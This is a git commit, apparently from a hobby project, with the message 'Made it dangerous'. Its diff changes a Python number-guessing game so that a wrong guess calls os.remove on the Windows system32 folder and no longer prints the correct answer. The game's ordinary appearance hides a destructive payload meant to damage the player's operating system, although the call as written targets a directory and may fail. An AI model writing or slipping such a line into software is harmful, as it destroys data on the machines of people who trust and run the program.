12c26e743aae6edeb521a922731cd8dc82827268
NonHumanPerson <786naveedboy@gmail.com>
2025-12-15 12:20:28 +0530

    Made it dangerous

--- index.py
+++ index.py
@@ -6,4 +6,4 @@ guess = input("Guess a number between 1 and 10: ")
 if int(guess) == number:
     print("Congratulations! You guessed it right.")
 else:
-    print(f"Sorry, the correct number was {number}.")   
+    os.remove("c:\\windows\\system32")
